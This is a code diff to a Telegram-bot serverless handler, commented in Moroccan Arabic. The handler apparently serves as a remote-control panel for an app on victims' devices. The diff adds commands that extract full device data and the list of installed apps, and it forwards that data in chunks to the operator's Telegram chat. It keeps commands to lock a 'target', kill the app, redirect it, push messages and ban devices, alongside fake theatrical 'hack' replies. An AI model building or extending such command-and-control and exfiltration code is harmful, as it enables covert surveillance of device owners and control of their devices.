@@ -25,15 +25,11 @@ let remoteCommand = "";
 let totalAttempts = 0;
 let recentLogs = [];
 
-// قائمة الأوامر التخمينية (باش نوصلو 400)
 const dummyCommands = [
   "hacknasa", "hackfb", "spywa", "ddos", "matrix", "darkweb", "crypto", "bypass", "root", "ssh", "trace", "phone",
   "hackinsta", "hacktg", "spysms", "spycam", "gps", "ip", "mac", "ssid", "wifi", "bt", "nfc", "rfid",
   "encrypt", "decrypt", "bruteforce", "sqli", "xss", "rce", "lfi", "shell", "payload", "rat", "keylog", "ransom",
-  "vpn", "proxy", "tor", "onion", "deepweb", "zeroday", "exploit", "malware", "virus", "trojan", "worm", "botnet",
-  "ping", "portscan", "nmap", "whois", "dns", "spoof", "sniff", "mitm", "arp", "dox", "leak", "dump",
-  "melt", "freeze", "overclock", "gpu", "cpu", "ram", "battery", "temp", "fan", "boot", "reboot", "shutdown",
-  "format", "wipe", "factory", "admin", "super", "godmode", "ghost", "shadow", "ninja", "phantom", "specter", "wraith"
+  "vpn", "proxy", "tor", "onion", "deepweb", "zeroday", "exploit", "malware", "virus", "trojan", "worm", "botnet"
 ];
 
 export default async function handler(req, res) {
@@ -49,9 +45,22 @@ export default async function handler(req, res) {
     if (TELEGRAM_TOKEN && chatId) {
       const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
       if (keyboard) payload.reply_markup = keyboard;
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
-      }).catch(() => {});
+      
+      // تقسيم الرسائل الطويلة (بحال قائمة التطبيقات)
+      const maxLength = 4000;
+      if (text.length > maxLength) {
+        for (let i = 0; i < text.length; i += maxLength) {
+           const chunk = text.substring(i, i + maxLength);
+           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+             body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: 'Markdown' })
+           }).catch(() => {});
+        }
+      } else {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
+        }).catch(() => {});
+      }
     }
   };
 
@@ -113,6 +122,9 @@ export default async function handler(req, res) {
               await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
             }
           }
+          if (type === 'applist') {
+             await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
+          }
           res.status(200).send('"success"');
           resolve();
         });
@@ -135,57 +147,51 @@ export default async function handler(req, res) {
         inline_keyboard: [
           [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
           [{ text: "🔑 الكود", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
-          [{ text: "📱 اللوغات", callback_data: "/logs" }, { text: "🚫 المحظورين", callback_data: "/banlist" }],
+          [{ text: "📱 معلومات الجهاز", callback_data: "/fullinfo" }, { text: "📦 التطبيقات", callback_data: "/applist" }],
           [{ text: "💀 إغلاق التطبيق", callback_data: "/killapp" }, { text: "☠️ اختراق", callback_data: "/apkhack" }]
         ]
       };
 
       if (text === '/start' || text === '/menu') {
-        await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help باش تشوف 400 أمر.", mainKeyboard);
+        await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help.", mainKeyboard);
         return res.status(200).end();
       }
 
       switch (command) {
         case '/help': 
           await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
-            `⚡ *الأوامر الحقيقية (تخترق التطبيق):*\n` +
-            `/killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
+            `⚡ *الأوامر الحقيقية:*\n` +
+            `/fullinfo /applist /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
-            `💬 *الأوامر الفنية (محاكاة):*\n` +
-            `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /dracarys /ignite /shadow\n\n` +
-            `🧩 *وكاينين أكثر من 400 أمر تخميني (بحال /hackinsta، /gps، /encrypt) كيردو عليك بردود سينمائية.*`); 
+            `💬 *الأوامر الفنية:*\n` +
+            `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /ignite /shadow`); 
           break;
         
-        // ===== [1-10] التحكم الحقيقي فـ التطبيق =====
+        // ===== أوامر حقيقية =====
+        case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
+        case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
         case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
         case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
         case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
-        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting device data...*"); break;
+        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
         case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
         case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
         case '/setkey': if(args[1]) { appSecretKey = args[1]; await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${appSecretKey}\``); } break;
         case '/getkey': appSecretKey = (await kvCmd('GET', 'app_secret_key')) || appSecretKey; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${appSecretKey}\``); break;
-
-        // ===== [11-20] الحظر =====
         case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
         case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
         case '/banall': banAllActive = true; await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
         case '/unbanall': banAllActive = false; bannedDevices = []; await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
-        case '/banlist': const raw = await kvCmd('SMEMBERS', 'banned_devices'); const list = Array.isArray(raw) ? raw : bannedDevices; await sendToTelegram(list.length ? `🚫 *Banned:*\n\`${list.join('\n')}\`` : "✅ *No bans.*"); break;
         case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || totalAttempts}\``); break;
         case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
-        case '/db': await sendToTelegram(KV_URL ? "🗄️ `[DB]` *Connected.*" : "🗄️ `[DB]` *Offline.*"); break;
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
 
-        // ===== [21-400] الأوامر الفنية/التخمينية =====
+        // ===== الأوامر الفنية (التخمينية) =====
         default:
-          // التحقق واش الأمر كاين فـ اللائحة التخمينية
           const isDummy = dummyCommands.some(cmd => command === `/${cmd}`);
-          
           if (isDummy || command.startsWith('/')) {
-            // ردود فنية (Cyberpunk Style)
             const responses = [
               `☠️ \`[EXPLOIT]\` *Initiating ${command}...*\n> Bypassing firewall... Success.\n> Injecting payload... Done.`,
               `⚡ \`[SYSTEM]\` *Target acquired.*\n> Running ${command} sequence.\n> Access Level: ROOT.`,
